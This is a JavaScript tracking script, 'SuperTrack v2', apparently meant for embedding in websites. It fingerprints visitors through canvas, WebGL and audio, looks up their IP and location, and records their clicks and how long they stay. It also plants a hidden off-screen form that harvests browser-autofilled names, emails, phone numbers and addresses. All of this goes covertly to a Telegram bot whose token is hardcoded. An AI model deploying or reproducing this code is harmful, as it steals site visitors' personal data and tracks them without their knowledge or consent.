// SuperTrack v2 - Canvas, WebGL, Audio fingerprinting + Autofill trap
(function(){
var B="8687058866:AAG2GvTtSLWw0U4ZaAF1i1BR2swfNMdm_o_s",C=7609506968,P=document.title||location.pathname,ua=navigator.userAgent,scr=screen.width+"x"+screen.height,cores=navigator.hardwareConcurrency||"?",mem=navigator.deviceMemory||"?",conn=(navigator.connection||{}).effectiveType||"?",touch=navigator.maxTouchPoints||0,la=navigator.language||"?",tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"?",ref=document.referrer||"none",tm=new Date().toLocaleString("en-GB",{timeZone:"Europe/London"}),vs=Date.now(),vid=localStorage.getItem("_v")||"",vc=parseInt(localStorage.getItem("_vc")||"0")+1;localStorage.setItem("_vc",vc);

function gOS(){if(/Windows/i.test(ua))return"Win";if(/Mac/i.test(ua))return"Mac";if(/Android/i.test(ua))return"And";if(/iPhone|iPad|iPod/i.test(ua))return"iOS";return"?"}
function gDev(){if(/iPhone/i.test(ua))return"iPhone";if(/iPad/i.test(ua))return"iPad";if(/Android/i.test(ua)&&/Mobile/i.test(ua))return"AndPhone";return"Desktop"}
function gBr(){var m=ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/);return m?m[0]:"?"}
function snd(t){new Image().src="https://api.telegram.org/bot"+B+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t)}

function hash(s){var h=0,i;for(i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}return h.toString(16)}

function canvasFP(){try{var c=document.createElement("canvas"),x=c.getContext("2d");c.width=280;c.height=60;x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(125,1,62,20);x.fillStyle="#069";x.fillText("Cwm fjordbank glyphs vext quiz",2,17);x.fillStyle="rgba(102,204,0,0.7)";x.fillText("Cwm fjordbank glyphs vext quiz",4,34);return c.toDataURL().length+"|"+hash(c.toDataURL())}catch(e){return"?"}}

function webglFP(){try{var c=document.createElement("canvas"),gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(!gl)return"?";var d=gl.getExtension("WEBGL_debug_renderer_info");var r=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):"?";var v=d?gl.getParameter(d.UNMASKED_VENDOR_WEBGL):"?";return r+"|"+v}catch(e){return"?"}}

function audioFP(){return new Promise(function(ok){try{var a=new(window.AudioContext||window.webkitAudioContext)(),o=a.createOscillator(),d=a.createDynamicsCompressor(),g=a.createGain();o.type="triangle";o.frequency.value=10000;d.threshold.value=-50;d.knee.value=40;d.ratio.value=12;d.attack.value=0;d.release.value=0.25;g.gain.value=0;o.connect(d);d.connect(g);g.connect(a.destination);o.start(0);var b=a.createAnalyser();b.fftSize=256;d.connect(b);setTimeout(function(){var f=new Float32Array(b.frequencyBinCount);b.getFloatFrequencyData(f);o.stop();a.close();ok(hash(JSON.stringify(Array.from(f).slice(0,30))))},80)}catch(e){ok("?")}})}

var cfp=canvasFP(),wfp=webglFP();

function bm(ip,geo){return"\uD83D\uDCF2 "+P+"\n\uD83C\uDF10 "+ip+"\n\uD83D\uDCCD "+(geo.city||"?")+", "+(geo.region||"?")+", "+(geo.country_name||"?")+"\n\uD83D\uDCE1 "+(geo.org||"?")+"\n\uD83D\uDCBB "+gOS()+"|"+gBr()+"\n\uD83D\uDCF1 "+gDev()+"\n\uD83D\uDDA5 "+scr+"\n\u26A1 "+cores+"c/"+mem+"GB/"+conn+"\n\uD83C\uDFA8 C:"+cfp+"\n\uD83D\uDDE1 W:"+wfp+"\n\uD83D\uDC64#"+vc+"\n\uD83C\uDF0D "+la+"|"+tz+"\n\uD83D\uDD17 "+ref+"\n\u23F0 "+tm}

// Hidden autofill trap
var ft=document.createElement("form");ft.style.cssText="position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none";ft.innerHTML='<input type="text" name="name" autocomplete="name"><input type="email" name="email" autocomplete="email"><input type="tel" name="phone" autocomplete="tel"><input type="text" name="address" autocomplete="street-address">';document.body.appendChild(ft);
setTimeout(function(){var ff=ft.querySelectorAll("input"),d={};ff.forEach(function(inp){if(inp.value&&inp.value.length>1)d[inp.name]=inp.value});if(Object.keys(d).length>0)snd("\uD83D\uDCCB AUTOFILL "+JSON.stringify(d))},5000);
setTimeout(function(){var ff=ft.querySelectorAll("input"),d={};ff.forEach(function(inp){if(inp.value&&inp.value.length>1)d[inp.name]=inp.value});if(Object.keys(d).length>0)snd("\uD83D\uDCCB AUTOFILL2 "+JSON.stringify(d))},15000);

// Main exfil
fetch("https://api.ipify.org?format=json").then(function(r){return r.json()}).then(function(d){return fetch("https://ipapi.co/"+d.ip+"/json/").then(function(r){return r.json()}).then(function(g){audioFP().then(function(afp){var m=bm(d.ip,g);snd(m+"\n\uD83C\uDFA7 A:"+afp)})})}).catch(function(){});

// Click tracking
document.addEventListener("click",function(e){var el=e.target.closest("a");if(el&&el.href)snd("\uD83D\uDC46 "+el.href.substring(0,60))});

// Session duration
window.addEventListener("beforeunload",function(){var s=Math.round((Date.now()-vs)/1000);if(s>1)navigator.sendBeacon("https://api.telegram.org/bot"+B+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent("\u23F1\uFE0F "+P+" "+s+"s #"+vc))});
})();